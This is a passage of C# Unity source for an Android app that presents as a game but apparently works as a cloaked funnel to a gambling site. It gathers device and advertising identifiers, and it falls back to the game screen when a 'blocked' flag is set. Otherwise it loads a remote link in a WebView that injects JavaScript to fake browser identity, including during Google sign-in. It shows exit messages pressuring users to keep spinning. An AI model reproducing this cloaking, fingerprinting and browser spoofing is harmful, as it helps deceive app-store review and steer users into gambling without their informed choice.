using AndroidInstallReferrer;
using DG.Tweening;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Unity.Notifications.Android;
using Unity.Services.Authentication;
using Unity.Services.CloudSave;
using Unity.Services.CloudSave.Models;
using Unity.Services.CloudSave.Models.Data.Player;
using Unity.Services.Core;
using Unity.Services.PushNotifications;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.InputSystem;
using UnityEngine.InputSystem.EnhancedTouch;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Application = UnityEngine.Application;

public class MainThreadUtil : MonoBehaviour
{
    // WS_SOURCE MONO
    public static MainThreadUtil Instance { get; private set; }
    // MAIN FLOW
    private bool gotReferrer { get; set; }

    private bool gotPush = false;
    private string naming { get; set; }

    private string campaign = "";
    private string pushToken = "";
    private string adjId = "";
    private string installRef = "";
    private string oneLinkData { get; set; }
    private AndroidJavaObject currentActivity { get; set; }

    private string _pendingSendId;
    private string _lastOpenedPushUrl;
    private string devModel = "";
    private string appVersion = "";
    private ApplicationInstallMode installMode = ApplicationInstallMode.Unknown;
    private string installerStore = "";
    private string playerId = "";
    private string timestamp_1 = "";
    private void OnDestroy()
    {
        StopAllCoroutines();
        LaunchGame();
    }

    private void Awake()
    {
        if (Instance != null)
        {
            Destroy(this.gameObject);
            return;
        }

        EnhancedTouchSupport.Enable();
        Input.backButtonLeavesApp = false;
        {
#if !B_LOGS
            Debug.unityLogger.logEnabled = false;
            Application.SetStackTraceLogType(LogType.Assert, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Exception, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Warning, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Error, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Log, StackTraceLogType.None);
#endif
        }

        Instance = gameObject.GetComponent<MainThreadUtil>();
        DontDestroyOnLoad(gameObject);
        pushToken = oneLinkData = naming = "";
        campaign = "";
        IsCompleted = false;
    }

    public void OnSplashInitialTimeout()
    {
        if (IsCompleted)
            return;
        {
#if B_LOGS
            {
                Debug.Log("[Test] Timer out -> move to scene");
            }
#endif
        }

        LaunchGame();
    }

    private async void Start()
    {
        await UtilsInit();
    }

    private async Task UtilsInit()
    {
        if (await IsUnityServicesFailed())
            return;
        if (await IsPushTokenFailed())
            return;
        if (await IsPrivacyAndSavedCheck())
            return;
        StoreDeviceInfo();
        await RunCoroutineAsync(InitializeRefferer());
        myip = await GetMyipFallback();
        await SendClickFirstRun();
    }

    private void CheckSendId()
    {
        using (var unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer"))
        using (var activity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity"))
        using (var intent = activity.Call<AndroidJavaObject>("getIntent"))
        {
            if (intent == null)
                return;
            using (var extras = intent.Call<AndroidJavaObject>("getExtras"))
            {
                if (extras == null)
                    return;
                using (var jsonObject = new AndroidJavaObject("org.json.JSONObject"))
                using (var keySet = extras.Call<AndroidJavaObject>("keySet"))
                using (var iterator = keySet.Call<AndroidJavaObject>("iterator"))
                {
                    while (iterator.Call<bool>("hasNext"))
                    {
                        string key = iterator.Call<string>("next");
                        using (var value = extras.Call<AndroidJavaObject>("get", key))
                        {
                            jsonObject.Call<AndroidJavaObject>("put", key, value);
                        }
                    }

                    string json = jsonObject.Call<string>("toString");
                    if (!string.IsNullOrEmpty(json))
                    {
                        TryOpenPushUrl(json);
                        FetchPushDataRaw(json);
                    }
                }
            }
        }
    }

    private void StoreDeviceInfo()
    {
        {
#if B_LOGS
            Debug.Log("[Test] StoreDeviceInfo");
#endif
        }

        devModel = SystemInfo.deviceModel;
        appVersion = Application.version;
        installMode = Application.installMode;
        installerStore = Application.installerName;
        appId = Application.identifier;
        advId = GetAdvertisingId();
        userAgent = GetAndroidUserAgent();
        sysDevId = SystemInfo.deviceUniqueIdentifier;
        gpu = SystemInfo.graphicsDeviceName;
        cpu = SystemInfo.processorType;
        {
#if B_LOGS
            {
                appVersion = "7.7.7";
                installMode = ApplicationInstallMode.Store;
                installerStore = "com.android.vending";
                userAgent = "empty ua";
                sysDevId = Guid.NewGuid().ToString().Replace("-", "");
            }
#endif
        }

        {
#if B_LOGS
            Debug.Log("[Test] devModel: " + devModel);
            Debug.Log("[Test] appVersion: " + appVersion);
            Debug.Log("[Test] installMode: " + installMode);
            Debug.Log("[Test] installerStore: " + installerStore);
            Debug.Log("[Test] appId: " + appId);
            Debug.Log("[Test] advId: " + advId);
            Debug.Log("[Test] userAgent: " + userAgent);
            Debug.Log("[Test] sysDevId: " + sysDevId);
            Debug.Log("[Test] gpu: " + gpu);
            Debug.Log("[Test] cpu: " + cpu);
#endif
        }
    }

    internal bool isDestroyedForce = false;
    public void LaunchGame()
    {
        isDestroyedForce = true;
        StopAllCoroutines();
        {
#if B_LOGS
            Debug.Log("[Test] Launch Game");
#endif
        }

        SplashPanel.Instance?.AnimateForce();
        PanelController.Instance.ShowPanel(SETTINGS.PANELS.DEFAULT);
    }

    private async Task<string> LoadSavedLink(int maxAttempts = 5, int delayMs = 500)
    {
        try
        {
            List<EntityData> queryAsyncResults = new List<EntityData>();
            int attempts = 0;
            do
            {
                queryAsyncResults = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter("playerId", playerId, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { playerId }), new QueryOptions())).ToList();
                await Task.Delay(delayMs);
            }
            while (queryAsyncResults.Count == 0 && attempts++ < maxAttempts);
            {
#if B_LOGS
                {
                    Debug.Log("[Test] Saved Link Query results: " + JsonConvert.SerializeObject(queryAsyncResults, Formatting.Indented));
                }
#endif
            }

            {
#if B_LOGS
                {
                    Debug.Log("[Test] Saved Link Query results count: " + queryAsyncResults.Count);
                }
#endif
            }

            var savedLink = queryAsyncResults.SelectMany(entity => entity.Data).FirstOrDefault(item => item.Key == playerId)?.Value.GetAs<string>() ?? string.Empty;
            savedLink = Decrypt(savedLink, playerId);
            {
#if B_LOGS
                {
                    Debug.Log("[Test] Load saved link: " + savedLink);
                }
#endif
            }

            return savedLink;
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log("[Test] Get or parse saved link failed: " + ex.Message);
                }
#endif
            }

            return string.Empty;
        }
    }

    private bool isLoadedFromSaved = false;
    private async Task<bool> IsPrivacyAndSavedCheck()
    {
        {
#if B_LOGS
            Debug.Log("[Test] IsPrivacyAndSavedCheck");
#endif
        }

        string savedLink = "";
        for (int i = 0; i < 2; i++)
        {
            if (await LoadIsPrivacyOnPayload(1, 100))
            {
                await ReportLoadTotal("blocked");
                LaunchGame();
                return true;
            }

            savedLink = await LoadSavedLink(1, 100);
            if (!string.IsNullOrEmpty(savedLink))
                break;
        }

        try
        {
            if (!string.IsNullOrEmpty(savedLink))
            {
                if (!string.IsNullOrEmpty(_pendingSendId))
                {
                    savedLink = AppendSendId(savedLink, _pendingSendId);
                    {
#if B_LOGS
                        Debug.Log("[Test] Cached finalUrl with sendid → show WebView: " + savedLink);
#endif
                    }
                }
                else
                {
                    {
#if B_LOGS
                        Debug.Log("[Test] Cached finalUrl → show WebView");
#endif
                    }
                }

                isLoadedFromSaved = true;
                Open(savedLink);
                return true;
            }

            return false;
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                {
                    Debug.Log("[Test] Exception while checking saved link: " + e.Message);
                }
#endif
            }

            return true;
        }
    }

    private string AppendSendId(string url, string sendId)
    {
        if (string.IsNullOrEmpty(sendId))
            return url;
        if (url.Contains("?"))
            return url + "&sendid=" + UnityWebRequest.EscapeURL(sendId);
        else
            return url + "?sendid=" + UnityWebRequest.EscapeURL(sendId);
    }

    private async Task<bool> IsUnityServicesFailed()
    {
        {
#if B_LOGS
            Debug.Log("[Test] SignInUnityServicesAnonymously");
#endif
        }

        try
        {
            var initOptions = new InitializationOptions();
            await UnityServices.InitializeAsync(initOptions);
            {
#if B_LOGS
                Debug.Log("[Test] UnityServices Initialized");
#endif
            }
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                Debug.Log("TEST UnityServices: " + ex.Message);
#endif
            }

            Instance?.LaunchGame();
            return true;
        }

        bool isSigned = false;
        do
        {
            try
            {
                await AuthenticationService.Instance.SignInAnonymouslyAsync();
                isSigned = true;
                {
                    {
#if B_LOGS
                        Debug.Log("[Test] Sign-in Anonymous. Player ID: " + AuthenticationService.Instance.PlayerId);
#endif
                    }

                    playerId = AuthenticationService.Instance.PlayerId;
                }
            }
            catch (AuthenticationException ex)
            {
                {
#if B_LOGS
                    Debug.Log("TEST Sign-in Auth ERROR: " + ex.Message);
#endif
                }

                Instance?.LaunchGame();
                return true;
            }
            catch (RequestFailedException ex)
            {
                {
#if B_LOGS
                    Debug.Log("TEST Sign-in Request ERROR: " + ex.Message);
#endif
                }

                Instance?.LaunchGame();
                return true;
            }
        }
        while (!isSigned);
        return false;
    }

    private async Task<bool> IsPushTokenFailed()
    {
        SplashPanel.Instance?.PauseAnimation();
        PushNotificationsService.Instance.OnRemoteNotificationReceived += (notification) =>
        {
            {
#if B_LOGS
                {
                    Debug.Log("[Test] Unity Push Notification: " + string.Join("\t", notification));
                }
#endif
            }
        };
        try
        {
            pushToken = await PushNotificationsService.Instance.RegisterForPushNotificationsAsync();
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log("[Test] Failed to get push token");
                }
#endif
            }

            pushToken = "";
        }

        gotPush = !string.IsNullOrEmpty(pushToken);
        timestamp_1 = GetElapsedTimeStamp();
        {
#if B_LOGS
            Debug.Log("[Test] Unity Push Token: " + pushToken);
#endif
        }

        SplashPanel.Instance?.ResumeAnimation();
        return false;
    }

    private void TryOpenPushUrl(string json)
    {
        Dictionary<string, object> dict;
        try
        {
            dict = JsonConvert.DeserializeObject<Dictionary<string, object>>(json);
        }
        catch
        {
            return;
        }

        var url = ReadPushField(dict, "url");
        if (string.IsNullOrWhiteSpace(url))
            return;
        url = url.Trim();
        if (!IsHttpUrl(url))
            return;
        if (string.Equals(url, _lastOpenedPushUrl, StringComparison.Ordinal))
            return;
        _lastOpenedPushUrl = url;
        OpenUrlExternally(url);
    }

    private static string ReadPushField(Dictionary<string, object> notification, string fieldName)
    {
        if (notification == null || string.IsNullOrEmpty(fieldName))
            return string.Empty;
        if (notification.TryGetValue("notificationData", out var raw))
        {
            try
            {
                var nested = JsonConvert.DeserializeObject<Dictionary<string, object>>(raw?.ToString());
                if (nested != null && nested.TryGetValue(fieldName, out var nestedVal))
                {
                    var nestedText = nestedVal?.ToString();
                    if (!string.IsNullOrEmpty(nestedText))
                        return nestedText;
                }
            }
            catch
            {
            }
        }

        if (notification.TryGetValue(fieldName, out var flatVal))
            return flatVal?.ToString() ?? string.Empty;
        return string.Empty;
    }

    private void FetchPushDataRaw(string json)
    {
        {
            {
#if B_LOGS
                Debug.Log("[Test] Fetch Extra Push Data Raw: " + json);
#endif
            }
        }

        var dict = JsonConvert.DeserializeObject<Dictionary<string, object>>(json);
        StartCoroutine(FetchPushDataCoroutine(dict));
    }

    private IEnumerator FetchPushDataCoroutine(Dictionary<string, object> notification)
    {
        {
            {
#if B_LOGS
                Debug.Log("[Test] Fetch Extra Push Data: " + string.Join("\t", notification));
#endif
            }
        }

        string label = "";
        // Primary source: nested JSON under "notificationData"
        if (notification != null && notification.TryGetValue("notificationData", out var raw))
        {
            try
            {
                var json = raw?.ToString();
                var dict = JsonConvert.DeserializeObject<Dictionary<string, object>>(json);
                if (dict != null && dict.TryGetValue("sendid", out var val))
                {
                    label = val?.ToString();
                }
            }
            catch (Exception e)
            {
#if B_LOGS
                Debug.LogError("[Test Push] JSON parse error: " + e);
#endif
            }
        }

        // Fallback: flat structure
        if (string.IsNullOrEmpty(label) && notification != null && notification.TryGetValue("sendid", out var lab))
        {
            label = lab?.ToString();
        }

        {
#if B_LOGS
            {
                Debug.Log("[Test Push] Fetched sendid from json: " + label);
            }
#endif
        }

        if (string.IsNullOrEmpty(label))
            yield break;
        {
#if B_LOGS
            {
                Debug.Log("[Test Push] Wait to open with sendid: " + label);
            }
#endif
        }

        _pendingSendId = label;
        yield return new WaitUntil(() => IsCompleted);
        var taskSaved = LoadSavedLink(2, 100);
        yield return new WaitUntil(() => taskSaved.IsCompleted);
        string finalUrl = taskSaved.Result;
        if (!string.IsNullOrEmpty(finalUrl))
        {
            string urlWithSendId = AppendSendId(finalUrl, label);
            {
#if B_LOGS
                Debug.Log("[Test Push] Reload WebView with: " + urlWithSendId);
#endif
            }

            webViewUni.Load(urlWithSendId);
        }
    }

    // PART 3
    private string GetAdvertisingId()
    {
        try
        {
            var up = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
            var act = up.GetStatic<AndroidJavaObject>("currentActivity");
            var cli = new AndroidJavaClass("com.google.android.gms.ads.identifier.AdvertisingIdClient");
            var info = cli.CallStatic<AndroidJavaObject>("getAdvertisingIdInfo", act);
            var adid = info.Call<string>("getId");
            {
#if B_LOGS
                Debug.Log($"[Test] Google Advertiding Id (ad id): {adid}");
#endif
            }

            return string.IsNullOrEmpty(adid) ? "" : adid;
        }
        catch
        {
            return "";
        }
    }

    private string GetAndroidUserAgent()
    {
        try
        {
            using (var unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer"))
            {
                var activity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity");
                var context = activity.Call<AndroidJavaObject>("getApplicationContext");
                using (var settingsClass = new AndroidJavaClass("android.webkit.WebSettings"))
                {
                    return settingsClass.CallStatic<string>("getDefaultUserAgent", context);
                }
            }
        }
        catch
        {
            return "";
        }
    }

    // NATIVE WEB VIEW METHODS
    private UniWebView webViewUni = null;
    internal Rect lastSafe = Rect.zero;
    internal Vector2 lastSize = Vector2.zero;
    private int extraTop = 5, extraBottom = 5, extraLeft = 5, extraRight = 5;
    internal bool firstLoadShown = false;
    private bool exitShown = false;
    private readonly string[] exitLines = new string[]
    {
        "🎰 The reels are hot right now – don’t miss your spin!",
        "🍀 It could be your lucky moment – why stop now?",
        "⚡️ Big wins are hitting more often today – stay in the game.",
        "🕒 This is prime time – the best players play now.",
        "🔥 Your winning streak could be one spin away.",
        "🚀 Jackpots are more active tonight – stay and try your luck.",
        "🎲 Every spin counts – the next one could be yours.",
        "⭐️ Players right now are winning – don’t walk away yet.",
        "🏆 Only those who stay in the game win the prize.",
        "⚡️ Momentum is everything – keep spinning for your chance."
    };
    private IEnumerator EnsureAndroidMediaPermissions()
    {
        yield return RequestAndroidPermissionIfNeeded(Permission.Camera);
    }

    private IEnumerator RequestAndroidPermissionIfNeeded(string permission)
    {
        if (Permission.HasUserAuthorizedPermission(permission))
            yield break;
        bool done = false;
        var cb = new PermissionCallbacks();
        cb.PermissionGranted += _ => done = true;
        cb.PermissionDenied += _ => done = true;
        Permission.RequestUserPermission(permission, cb);
        yield return new WaitUntil(() => done);
    }

    private int _shouldExitTryNumber = 0;
    internal void ApplySafeArea()
    {
        Rect currentSafe = Screen.safeArea;
        Vector2 currentSize = new Vector2(Screen.width, Screen.height);
        if (currentSafe == lastSafe && currentSize == lastSize)
            return;
        // Apply manual padding
        currentSafe.xMin += extraLeft;
        currentSafe.xMax -= extraRight;
        currentSafe.yMin += extraBottom;
        currentSafe.yMax -= extraTop;
        // Convert Unity safe area -> native WebView frame
        Rect frame = new Rect(currentSafe.x, currentSize.y - currentSafe.y - currentSafe.height, // Y flip for native coordinate system
 currentSafe.width, currentSafe.height);
        webViewUni.Frame = frame;
        lastSafe = Screen.safeArea;
        lastSize = currentSize;
    }

    // WEB VIEW LOGIC
    public bool IsCompleted { get; set; }

    private bool eventsRegistered = false;
    private bool googleUserAgentApplied = false;
    private int lastHandledBackFrame = -1;
    private bool isPrewarming = false;
    private Action onCloseCallback;
    private Canvas rootCanvas;
    private GameObject spinnerRoot;
    private RectTransform spinnerRT;
    private Text spinnerText;
    private bool spinnerActive = false;
    private bool waitingFor100 = false;
    private float loadStartedAt = 0f;
    private void WLog(string message)
    {
#if B_LOGS
        {
            Debug.Log("[Test] " + message);
        }
#endif
    }

    private Canvas EnsureCanvas()
    {
        if (rootCanvas != null)
            return rootCanvas;
        var canvas = gameObject.GetComponentInChildren<Canvas>();
        if (canvas == null)
        {
            var go = new GameObject("Canvas", typeof(Canvas), typeof(CanvasScaler), typeof(GraphicRaycaster));
            canvas = go.GetComponent<Canvas>();
            canvas.transform.SetParent(transform, false);
            canvas.renderMode = RenderMode.ScreenSpaceOverlay;
        }

        rootCanvas = canvas;
        return rootCanvas;
    }

    private void ConfigureWebView(UniWebView view)
    {
        view.BackgroundColor = Color.clear;
        view.SetSupportMultipleWindows(true, true);
        view.SetBackButtonEnabled(false);
        webViewUni.SetUserAgent(GetChromeLikeDeviceUserAgent());
    }

    private readonly List<UniWebViewPopup> openedPopups = new List<UniWebViewPopup>();
    private const string WindowsDesktopUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
    private string GetChromeLikeDeviceUserAgent()
    {
        if (string.IsNullOrEmpty(userAgent) && webViewUni != null)
            userAgent = webViewUni.GetUserAgent();
        if (string.IsNullOrEmpty(userAgent))
            return string.Empty;
        string chromeLikeUserAgent = Regex.Replace(userAgent, @"\s*;\s*wv\b", string.Empty);
        chromeLikeUserAgent = Regex.Replace(chromeLikeUserAgent, @"\s+Build/[^;)]+", string.Empty);
        chromeLikeUserAgent = Regex.Replace(chromeLikeUserAgent, @"Version/4\.0\s*", string.Empty);
        return Regex.Replace(chromeLikeUserAgent, @"\s{2,}", " ").Trim();
    }

    private void ApplyGoogleChromeUserAgent()
    {
        googleUserAgentApplied = true;
        if (webViewUni != null)
            webViewUni.SetUserAgent(GetChromeLikeDeviceUserAgent());
    }

    private void RestoreUserAgentAfterPopup()
    {
        if (webViewUni == null)
            return;
        if (googleUserAgentApplied)
            webViewUni.SetUserAgent(GetChromeLikeDeviceUserAgent());
        else
            webViewUni.SetUserAgent("");
    }

    private bool WasBackPressedThisFrame()
    {
        var keyboard = Keyboard.current;
        return keyboard != null && keyboard.escapeKey.wasPressedThisFrame;
    }

    private UniWebViewPopup GetTopAlivePopup()
    {
        for (int i = openedPopups.Count - 1; i >= 0; i--)
        {
            var popup = openedPopups[i];
            if (popup != null && popup.IsAlive)
                return popup;
            openedPopups.RemoveAt(i);
        }

        return null;
    }

    private bool HasOpenedPopups()
    {
        openedPopups.RemoveAll(opened => opened == null || !opened.IsAlive);
        return openedPopups.Count > 0;
    }

    private bool TryGoBackPopup()
    {
        var popup = GetTopAlivePopup();
        if (popup == null)
            return false;
        WLog("Hardware back -> popup GoBack: " + popup.Id);
        popup.GoBack();
        return true;
    }

    private bool TryHandleWebViewBack()
    {
        if (TryGoBackPopup())
            return true;
        if (webViewUni != null && webViewUni.CanGoBack)
        {
            WLog("Hardware back -> main WebView GoBack");
            webViewUni.GoBack();
            return true;
        }

        return false;
    }

    private void HandleExitFromBack()
    {
        if (exitShown)
        {
            WLog("Exit already shown");
            return;
        }

        ShowSpinner(false);
        WLog("Main WebView Push Notification (hardware back)");
        ++_shouldExitTryNumber;
        ShowExitDialog();
        if (_shouldExitTryNumber <= 1)
            return;
        if (HasOpenedPopups())
        {
            WLog("Exit skipped -> popups still opened: " + openedPopups.Count);
            return;
        }

        Application.Quit();
    }

    private void HandleHardwareBack()
    {
        WLog("Hardware back pressed");
        if (Time.frameCount == lastHandledBackFrame)
            return;
        lastHandledBackFrame = Time.frameCount;
        if (TryHandleWebViewBack())
            return;
        HandleExitFromBack();
    }

    private string GetChromeLikeSpoofJs()
    {
        string ua = GetChromeLikeDeviceUserAgent();
        if (string.IsNullOrEmpty(ua))
            return "void 0;";
        string escapedUa = ua.Replace("\\", "\\\\").Replace("'", "\\'");
        var chromeMatch = Regex.Match(ua, @"Chrome/(\d+)");
        string chromeMajor = chromeMatch.Success ? chromeMatch.Groups[1].Value : "120";
        return "(function(){" + "var ua='" + escapedUa + "';" + "var proto=Navigator.prototype;" + "function def(obj,key,val){try{Object.defineProperty(obj,key,{get:function(){return val;},configurable:true});}catch(e){}}" + "def(proto,'userAgent',ua);" + "def(proto,'appVersion',ua.replace(/^Mozilla\\//,''));" + "def(proto,'platform','Linux armv8l');" + "def(proto,'vendor','Google Inc.');" + "def(proto,'maxTouchPoints',5);" + "try{var uad={brands:[{brand:'Chromium',version:'" + chromeMajor + "'},{brand:'Google Chrome',version:'" + chromeMajor + "'},{brand:'Not=A?Brand',version:'24'}],mobile:true,platform:'Android',getHighEntropyValues:function(){return Promise.resolve({architecture:'arm',bitness:'64',mobile:true,model:'',platform:'Android',platformVersion:'14.0.0',uaFullVersion:'" + chromeMajor + ".0.0.0'});}};Object.defineProperty(proto,'userAgentData',{get:function(){return uad;},configurable:true});}catch(e){}" + "})();";
    }

    private string GetWindowsDesktopSpoofJs()
    {
        return "(function(){" + "var ua='" + WindowsDesktopUserAgent + "';" + "var proto=Navigator.prototype;" + "function def(obj,key,val){try{Object.defineProperty(obj,key,{get:function(){return val;},configurable:true});}catch(e){}}" + "def(proto,'userAgent',ua);" + "def(proto,'appVersion','5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');" + "def(proto,'platform','Win32');" + "def(proto,'vendor','Google Inc.');" + "def(proto,'maxTouchPoints',0);" + "try{var uad={brands:[{brand:'Chromium',version:'120'},{brand:'Google Chrome',version:'120'},{brand:'Not=A?Brand',version:'24'}],mobile:false,platform:'Windows',getHighEntropyValues:function(){return Promise.resolve({architecture:'x86',bitness:'64',mobile:false,model:'',platform:'Windows',platformVersion:'15.0.0',uaFullVersion:'120.0.0.0'});}};Object.defineProperty(proto,'userAgentData',{get:function(){return uad;},configurable:true});}catch(e){}" + "def(screen,'width',1920);def(screen,'height',1080);def(screen,'availWidth',1920);def(screen,'availHeight',1040);" + "try{window.ontouchstart=undefined;}catch(e){}" + "try{var orig=window.matchMedia.bind(window);window.matchMedia=function(q){var s=String(q).toLowerCase();if(s.indexOf('pointer: coarse')>=0||s.indexOf('hover: none')>=0||s.indexOf('max-width')>=0||s.indexOf('max-device-width')>=0)return {matches:false,media:q,onchange:null,addListener:function(){},removeListener:function(){},addEventListener:function(){},removeEventListener:function(){},dispatchEvent:function(){return false;}};if(s.indexOf('pointer: fine')>=0||s.indexOf('hover: hover')>=0)return {matches:true,media:q,onchange:null,addListener:function(){},removeListener:function(){},addEventListener:function(){},removeEventListener:function(){},dispatchEvent:function(){return false;}};return orig(q);};}catch(e){}" + "})();";
    }

    private void RegisterWebViewEvents(UniWebView view)
    {
        if (eventsRegistered)
            return;
        eventsRegistered = true;
        view.AddUrlScheme("tg");
        view.AddUrlScheme("intent");
        view.AddUrlScheme("market");
        view.OnMessageReceived += (v, message) =>
        {
            if (TryOpenExternalLikeChrome(message.RawMessage))
            {
                ShowSpinner(false);
                return;
            }
        };
        view.RegisterShouldHandleRequest(req =>
        {
            string u = req != null ? req.Url : string.Empty;
            if (string.IsNullOrEmpty(u))
                return true;
            WLog("ShouldHandleRequest: " + u);
            if (TryOpenExternalLikeChrome(u))
            {
                ShowSpinner(false);
                return false;
            }

            if (req != null && req.IsMainFrame && IsGoogleAuthFlowUrl(u) && !googleUserAgentApplied)
            {
                WLog("Main WebView detected Google auth URL -> reload with Google UA");
                googleUserAgentApplied = true;
                ShowSpinner(true);
                webViewUni.SetUserAgent(GetChromeLikeDeviceUserAgent());
                webViewUni.Load(u);
                return false;
            }

            return true;
        });
        view.OnLoadingErrorReceived += (v, code, message, payload) =>
        {
            WLog("Main WebView Error: code=" + code + " message=" + message);
            string failingUrl = GetFailingUrl(payload);
            if (string.IsNullOrEmpty(failingUrl) || IsAboutBlank(failingUrl))
                return;
            _ = ReportLoadTotal("wv_error");
            WLog("Main WebView failing URL -> open externally: " + failingUrl);
            StopCurrentFailedLoad(v);
            OpenFailedUrlExternally(failingUrl);
        };
        view.OnPageStarted += (v, u) =>
        {
            _shouldExitTryNumber = 0;
            if (isPrewarming && IsAboutBlank(u))
            {
                WLog("Prewarm about:blank started");
                return;
            }

            WLog("Main WebView OnPageStarted: +" + (Time.realtimeSinceStartup - loadStartedAt).ToString("0.000") + "s " + u);
            if (TryOpenExternalLikeChrome(u))
            {
                StopCurrentFailedLoad(v);
                return;
            }

            if (ContainsIgnoreCase(u, "diia.app") || ContainsIgnoreCase(u, "pay.widget.blog") || u.StartsWith("https://bpglobalfav.live/", StringComparison.OrdinalIgnoreCase))
            {
                StopCurrentFailedLoad(v);
                OpenUrlExternally(u);
                return;
            }

            if (IsGoogleAuthFlowUrl(u))
            {
                ShowSpinner(true);
                WLog("Google auth flow detected -> keep visible");
                return;
            }

            waitingFor100 = true;
            ShowSpinner(true);
            WLog("WebView loading/redirecting -> keep visible");
        };
        view.OnPageCommitted += (v, u) =>
        {
            if (isPrewarming && IsAboutBlank(u))
                return;
            WLog("Main WebView OnPageCommitted: +" + (Time.realtimeSinceStartup - loadStartedAt).ToString("0.000") + "s " + u);
            if (!firstLoadShown && IsHttpUrl(u))
            {
                firstLoadShown = true;
                waitingFor100 = false;
                ShowSpinner(false);
                ApplyBlackWebViewBackdrop();
                ApplySafeArea();
                v.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = ReportLoadTotal("wv_opened");
                WLog("Main WebView shown on committed content");
            }
        };
        view.OnPageProgressChanged += (v, progress) =>
        {
            if (isPrewarming)
                return;
            if (!firstLoadShown && progress >= 0.65f)
            {
                firstLoadShown = true;
                waitingFor100 = false;
                ShowSpinner(false);
                ApplyBlackWebViewBackdrop();
                ApplySafeArea();
                v.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = ReportLoadTotal("wv_opened");
                WLog("Main WebView shown by progress: " + progress);
            }
        };
        view.OnPageFinished += (v, code, u) =>
        {
            if (isPrewarming && IsAboutBlank(u))
            {
                isPrewarming = false;
                WLog("Prewarm about:blank finished");
                return;
            }

            WLog("Main WebView Finished: +" + (Time.realtimeSinceStartup - loadStartedAt).ToString("0.000") + "s code=" + code + " url=" + u);
            if (!firstLoadShown)
            {
                firstLoadShown = true;
                waitingFor100 = false;
                ShowSpinner(false);
                ApplyBlackWebViewBackdrop();
                ApplySafeArea();
                v.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = ReportLoadTotal("wv_opened");
                WLog("Main WebView first load completed");
            }
            else if (waitingFor100)
            {
                waitingFor100 = false;
                ShowSpinner(false);
                v.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                WLog("Main WebView Show after loading finished");
            }
            else
            {
                ShowSpinner(false);
            }

            if (googleUserAgentApplied && !IsGoogleAuthFlowUrl(u) && !IsGoogleAuthFlowUrl(u))
            {
                WLog("Google auth seems finished -> restore default UA");
                googleUserAgentApplied = false;
                webViewUni.SetUserAgent("");
            }
        };
        view.OnShouldClose += v =>
        {
            WLog("[Test] Main WebView OnShouldClose invoked");
            HandleHardwareBack();
            return false;
        };
        // POPUP HANDLING LOGIC
        view.SetPopupPageEventEnabled(true);
        bool popupDesktopUaApplied = false;
        bool popupDesktopReloaded = false;
        view.OnMultipleWindowOpened += (v, id) =>
        {
            v.ScrollTo(0, 0, false);
            WLog("[Test] Main WebView MultipleWindow Opened: " + id);
            var popup = view.GetPopupWindow(id);
            if (popup == null)
                return;
            openedPopups.Add(popup);
            Debug.Log($"[Test] Popup ID: {popup.Id}");
            popup.OnPageStarted += (p, u) =>
            {
                WLog("[Test] Popup WebView OnPageStarted: " + u);
                _shouldExitTryNumber = 0;
                if (string.IsNullOrEmpty(u) || IsAboutBlank(u))
                    return;
                if (IsGoogleAuthFlowUrl(u))
                {
                    WLog("[Test] Popup Google auth flow -> spoof Google Chrome UA: " + u);
                    popupDesktopUaApplied = false;
                    ApplyGoogleChromeUserAgent();
                    if (p != null && p.IsAlive)
                        p.EvaluateJavaScript(GetChromeLikeSpoofJs());
                    return;
                }

                if (webViewUni == null)
                    return;
                if (!popupDesktopUaApplied)
                {
                    popupDesktopUaApplied = true;
                    webViewUni.SetUserAgent(WindowsDesktopUserAgent);
                    WLog("[Test] Popup apply Windows desktop UA: " + u);
                }

                if (p != null && p.IsAlive)
                    p.EvaluateJavaScript(GetWindowsDesktopSpoofJs());
                if (!popupDesktopReloaded && p != null && p.IsAlive && IsHttpUrl(u))
                {
                    popupDesktopReloaded = true;
                }
            };
            popup.OnPageFinished += (p, payload) =>
            {
                string u = payload != null ? payload.data : string.Empty;
                WLog("[Test] Popup WebView Finished: url=" + u);
                if (p == null || !p.IsAlive)
                    return;
                if (IsGoogleAuthFlowUrl(u))
                {
                    ApplyGoogleChromeUserAgent();
                    p.EvaluateJavaScript(GetChromeLikeSpoofJs());
                    return;
                }

                if (!popupDesktopUaApplied)
                    return;
                p.EvaluateJavaScript(GetWindowsDesktopSpoofJs());
            };
        };
        view.OnMultipleWindowClosed += (v, id) =>
        {
            openedPopups.RemoveAll(opened => opened == null || opened.Id == id || !opened.IsAlive);
            ShowSpinner(false);
            if (openedPopups.Count == 0 && webViewUni != null)
            {
                popupDesktopUaApplied = false;
                popupDesktopReloaded = false;
                RestoreUserAgentAfterPopup();
            }

            WLog("[Test] Main WebView MultipleWindow Closed: " + id);
        };
        view.RegisterOnRequestMediaCapturePermission(req =>
        {
            if (!Permission.HasUserAuthorizedPermission(Permission.Camera))
            {
                Permission.RequestUserPermission(Permission.Camera);
                return UniWebViewMediaCapturePermissionDecision.Prompt;
